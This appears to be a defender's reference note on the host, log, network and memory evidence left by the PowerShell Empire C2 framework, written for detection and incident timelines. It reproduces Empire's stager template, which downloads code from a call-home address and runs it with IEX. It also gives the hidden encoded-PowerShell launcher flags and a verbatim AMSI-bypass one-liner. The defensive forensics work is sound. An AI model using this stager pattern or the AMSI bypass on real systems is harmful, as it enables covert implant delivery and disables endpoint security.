# PowerShell Empire — Target Evidence

Evidence left on the **implanted/victim** host and the network it sits on. Empire's target-side footprint splits cleanly into two eras of the agent's life: the **stager/staging process** (stage 0 → 1 → 2, verified directly against `empire/server/listeners/http.py`'s `generate_launcher()`), which is largely consistent regardless of agent language, and **post-check-in tasking**, which varies by module. This file covers both, plus the network-layer signature every listener type leaves.

## Contents
- [Stager Execution — Process Artifacts](#stager-execution--process-artifacts)
- [PowerShell Logging and AMSI Interaction](#powershell-logging-and-amsi-interaction)
- [Filesystem Artifacts](#filesystem-artifacts)
- [Windows Event Logs](#windows-event-logs)
- [Sysmon](#sysmon)
- [Network-Layer Evidence by Listener Type](#network-layer-evidence-by-listener-type)
- [Module Tasking Artifacts](#module-tasking-artifacts)
- [Endpoint Security Product Detections](#endpoint-security-product-detections)
- [Memory Forensics](#memory-forensics)
- [Building a Timeline](#building-a-timeline)

---

## Stager Execution — Process Artifacts

Verified directly against `generate_launcher()` in `empire/server/listeners/http.py` — the actual PowerShell code Empire renders, not a paraphrase:

```powershell
$ErrorActionPreference = "SilentlyContinue";
# [SafeChecks=True wraps everything below in: If($PSVersionTable.PSVersion.Major -ge 3){ ... }]
# [any configured Bypasses (mattifestation/etw/etc.) are inserted here, verbatim]
[System.Net.ServicePointManager]::Expect100Continue=0;
$wc=New-Object System.Net.WebClient;
$u='<UserAgent>';
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};  # HTTPS only
$ser=<obfuscated call-home address>;$t='<one of DefaultProfile's URIs>';
$wc.Headers.Add('User-Agent',$u);
$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;
$K=[System.Text.Encoding]::ASCII.GetBytes('<StagingKey, PLAINTEXT>');
$wc.Headers.Add("Cookie","<CookieName>=<base64 ChaCha20-Poly1305 routing packet>");
$data=$wc.DownloadData($ser+$t);
IEX ([Text.Encoding]::UTF8.GetString($data))
```

This is delivered as a single stage-0 launcher one-liner: `powershell -noP -sta -w 1 -enc <base64>` (the exact default `Launcher` value, verified in source). Decoding a captured `-enc` blob **recovers the listener's `StagingKey` in plaintext** directly from the `$K=[System.Text.Encoding]::ASCII.GetBytes('...')` line — the single highest-value artifact obtainable from stager text alone, and independent of whatever the operator set the key to.

| Artifact | Detail |
|---|---|
| Initial process | `powershell.exe -noP -sta -w 1 -enc <base64>` (PowerShell agent) — `-noP` (`-NoProfile`), `-sta` (single-threaded apartment), `-w 1` (`-WindowStyle Hidden`), `-enc` (Base64, UTF-16LE-encoded command). This exact flag combination is Empire's own default `Launcher` string, unchanged across the tool's history |
| Execution mechanism | `IEX ([Text.Encoding]::UTF8.GetString($data))` — classic `Invoke-Expression`-on-downloaded-string pattern, no additional child process spawned for the stage-0/1/2 exchange itself; everything happens inside the initial `powershell.exe` process |
| Non-PowerShell stagers | Python/IronPython: an interpreter process (`python.exe`/`ipy.exe`/whatever hosts IronPython) running equivalent `urllib.request`-based stage-0 logic; C# (Sharpire)/Go (Gopire): a standalone compiled `.exe` making the same HTTP request pattern natively, no interpreter process at all |
| Module-spawned children | Post-check-in tasking that shells out (`shell` task, most lateral-movement/persistence modules) spawns the expected child of the agent's own process — `cmd.exe`, `wmic.exe`, `schtasks.exe`, etc., depending on the specific module |

## PowerShell Logging and AMSI Interaction

- **Module Logging (Event ID 4103)** and **Script Block Logging (Event ID 4104)**, if enabled, capture the **decoded** contents of the `-enc` command block — meaning the entire stager body above (including the plaintext `StagingKey`) lands directly in the Windows Event Log even though it never touched disk. This is the single highest-leverage native logging control against Empire specifically, because the stager text is otherwise never written anywhere on the target filesystem.
- **AMSI bypass artifacts** — where a `Bypasses` option was applied (`mattifestation`: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($Null,$true)`), that exact string is present in the decoded ScriptBlock log entry *before* AMSI stops seeing subsequent commands in the same session — meaning ScriptBlock logging still captures the bypass attempt itself even though it blinds AMSI going forward. Defender/AMSI providers frequently flag this specific string signature directly (it's public and unchanged since ~2018), so its **absence** from an AMSI/Defender alert stream on a host that otherwise shows Empire-consistent behavior is itself informative (bypass succeeded before AMSI logged it, or a different/未signatured bypass variant was used).
- **`$ErrorActionPreference = "SilentlyContinue"`** at the top of every generated stager is a minor but consistent stylistic fingerprint — present regardless of listener type, language config, or obfuscation (obfuscation reorders/renames, but the functional behavior persists).

## Filesystem Artifacts

| Artifact | Notes |
|---|---|
| Dropped stager file | None by default for `multi_launcher` — it's a one-liner meant to be delivered inline (macro, `wmic` command line, etc.), not saved to target disk. A `save=true` stager generated as a **file** stager type (`windows_csharp_exe`, `osx_macho`, etc.) does land on disk with an operator-chosen filename — no fixed default name |
| `multi_generate_agent` (stageless) artifact | A single self-contained script/binary file if delivered this way rather than as a one-liner — check for the file existing anywhere delivery could have staged it (`%TEMP%`, Downloads, email attachment cache) |
| Module-planted files | Lateral-movement and persistence modules that drop a service binary, scheduled-task script, or registry payload leave exactly the artifacts documented in `Windows/12 - Lateral Movement.md` and `Windows/` persistence references for the underlying mechanism (SCM service creation, `schtasks`, WMI subscription, Run-key value) — Empire's own contribution is only the *payload content*, not a new mechanism |
| Golden Ticket / SID-history / Skeleton Key modules | No filesystem artifact by design (in-memory LSASS/domain-object modification) — see `Purple Teaming/Mimikatz/kerberos (Golden-Silver Ticket)/04 - Target Evidence.md` for the underlying mechanics these modules wrap |

## Windows Event Logs

| Log | Event ID | Signal |
|---|---|---|
| Microsoft-Windows-PowerShell/Operational | **4103** (Module Logging) | Captures pipeline execution detail, including parameter values, for the stage-0 launcher and any subsequent PowerShell-language tasking |
| Microsoft-Windows-PowerShell/Operational | **4104** (Script Block Logging) | Captures the **decoded** script block text — the single most valuable native log source for this tool, since it reverses the `-enc` obfuscation Empire relies on for the wire-transfer step |
| Security | **4688** (Process Creation, if command-line auditing enabled) | Captures the initial `powershell.exe -noP -sta -w 1 -enc ...` invocation and any module-spawned child processes |
| Security | 4697 / System 7045 (Service Installed) | For lateral-movement/persistence modules that create a Windows service (`invoke_psexec`-style) |
| Security | 4698 (Scheduled Task Created) | For `userland/schtasks` or `elevated/schtasks` persistence modules |
| Security | 4624/4625 (Logon) | Relevant for lateral-movement modules using explicit alternate credentials |

Cross-reference exact field mechanics in `Windows/12 - Lateral Movement.md` and `Windows/05 - Users, Groups & Authentication.md` — this note gives the tool-specific pattern, not a re-derivation of the base event schema.

## Sysmon

| Event ID | Signal |
|---|---|
| 1 (Process Create) | `powershell.exe` with a `-enc`/`-EncodedCommand` argument and `-noP -sta -w 1` flag combination is Empire's own default launcher signature — a strong starting filter even before decoding the payload. Non-PowerShell agents show the equivalent interpreter/compiled-binary process instead |
| 3 (Network Connect) | The stage-0/1/2 HTTP(S) request sequence and every subsequent tasking check-in — see the network-layer table below for what makes each request recognizable |
| 7 (Image/DLL Load) | Sharpire (C#) and Gopire (Go) agents, being compiled binaries executing their own logic, show a normal module-load pattern for their runtime (`.NET`/CLR assemblies for C#; largely static for Go) — less differentiating than for reflectively-loaded tools |
| 8 / 10 (CreateRemoteThread / ProcessAccess) | Only relevant for specific modules that perform process injection (e.g. shellcode-execution or process-migration-style modules) — not a default characteristic of ordinary Empire tasking, which mostly executes in the agent's own process or spawns visible children |

## Network-Layer Evidence by Listener Type

| Listener | What to look for |
|---|---|
| `http`/`https` | Requests to one of `DefaultProfile`'s configured URIs (default, unmodified: `/admin/get.php`, `/news.php`, `/login/process.php`) carrying a `Cookie: <CookieName>=<base64>` header (default cookie name: `session`) whose value is a base64-encoded ChaCha20-Poly1305 routing packet — not human-decodable without the `StagingKey`, but structurally consistent in size/format across requests from the same listener. Default response `Server: Microsoft-IIS/7.5` header is spoofed IIS on what is actually a Python/Werkzeug server — a mismatch detectable by anyone fingerprinting the actual TLS/HTTP stack behavior against the claimed server software |
| `http_malleable` | Traffic shaped to match whatever Cobalt-Strike-format `.profile` was loaded — no fixed pattern; correlate against known public/leaked Malleable profiles (BC-Security's own [`Malleable-C2-Profiles`](https://github.com/BC-SECURITY/Malleable-C2-Profiles) repo, or the wider Cobalt Strike profile-sharing community) to identify which threat/tool a given profile is emulating |
| `http_hop` | Traffic to the redirector host runs `hop.php` — from the target's perspective this is indistinguishable from any other HTTP request to that host; the interesting evidence lives on the **redirector** itself (a `hop.php` file present, and its own outbound forwarding traffic to the real listener) |
| `smb` | `\\.\pipe\<PipeName>` on the pivot host — default `empire_pipe` if unmodified, enumerable via `Get-ChildItem \\.\pipe\` or Sysmon Event ID 17/18 (Pipe Created/Connected) while active. No network-layer traffic leaves the pivoted host at all — the defining characteristic, same logic as Sliver's named-pipe pivot |
| `port_forward_pivot` | A second, internal listening port (operator-chosen `ListenPort`) on the pivot host relaying to the real listener — Sysmon 3 on the pivot host shows both the inbound (from the pivoted agent) and outbound (to the real listener) legs |
| TLS fingerprint (any HTTPS listener) | JA3/JA3S is **not randomized by default** (`JA3_Evasion` defaults to `False`) — an unmodified HTTPS listener presents a consistent, fingerprint-able TLS client/server hello shape from the underlying Python TLS stack until an operator explicitly enables the evasion option |

## Module Tasking Artifacts

Because module execution is tasked over the already-established C2 channel rather than a fresh connection, most module-specific evidence is exactly what the wrapped tool itself would leave — Empire's own contribution is only the delivery mechanism:

- **Mimikatz modules** → identical LSASS-access/memory-forensics signature to running Mimikatz directly; see `Purple Teaming/Mimikatz/sekurlsa (Credential Dumping)/04 - Target Evidence.md` for the `GrantedAccess` mask/Sysmon 10 discussion.
- **Rubeus module** → identical Kerberos-ticket-request signature (Event 4768/4769) to running Rubeus directly.
- **Seatbelt/SharpHound modules** → identical enumeration footprint to running those tools directly (see `Purple Teaming/Seatbelt/` and `Purple Teaming/BloodHound/SharpHound/`), executed via Empire's in-memory C# compilation/execution pipeline rather than a dropped `.exe`.
- **Lateral-movement modules** → the exact target-host artifacts (new service, new scheduled task, new WMI consumer) documented for that mechanism generally in `Windows/12 - Lateral Movement.md`, with the **payload** being a fresh Empire stager rather than, say, a Cobalt Strike beacon or raw Meterpreter shellcode.

## Endpoint Security Product Detections

Empire is one of the most heavily fingerprinted open-source C2 frameworks in the industry precisely because its default configuration (launcher flags, `StagingKey`, `DefaultProfile` URIs, cookie name, spoofed IIS header) has been publicly documented and unchanged across most of its history. Expect mainstream EDR/AV products to carry: signatures on the `-noP -sta -w 1 -enc` launcher pattern combined with a `WebClient`/`DownloadData` call chain, the `mattifestation` AMSI-bypass string specifically, and behavioral detections on `IEX`-of-downloaded-content generally (a pattern common to many PowerShell-based tools, not unique to Empire). As with any actively developed framework, `Bypasses`, `Obfuscate`, and non-default `DefaultProfile`/`StagingKey` values are specifically designed to reduce static signature reliability — treat a clean EDR scan as weak evidence of absence given how configurable these defaults are, and prioritize the network/logging signals above.

## Memory Forensics

A PowerShell-agent process's memory holds the decoded stager (including the plaintext `StagingKey`), the negotiated AES session key, and any module code executed `IEX`-style that never touched disk — recoverable via standard PowerShell-process memory analysis even where ScriptBlock logging was disabled. Sharpire (C#) agent memory holds the loaded .NET assembly and its decrypted C2 config similarly; Gopire (Go) agent memory holds the compiled binary's own embedded config.

## Building a Timeline

**[stager delivery, out-of-band] → [initial `powershell.exe`/interpreter/binary execution, Sysmon 1 + Security 4688] → [stage-0/1/2 HTTP(S) exchange, Sysmon 3, 2-4 requests in quick succession] → [ScriptBlock log 4104 capturing the decoded stager and StagingKey, if PowerShell + logging enabled] → [periodic tasking check-ins at DefaultDelay±DefaultJitter, Sysmon 3] → [any module-spawned child processes/service-creation/scheduled-task events for specific tasking] → [source-side task timestamps from `03 - Source Evidence.md`'s database, if accessible]**. The stage-0/1/2 exchange is the most useful anchor point for initial-access timing — it's a tight, multi-request burst distinguishable from the looser, jittered spacing of ongoing tasking check-ins that follow it.
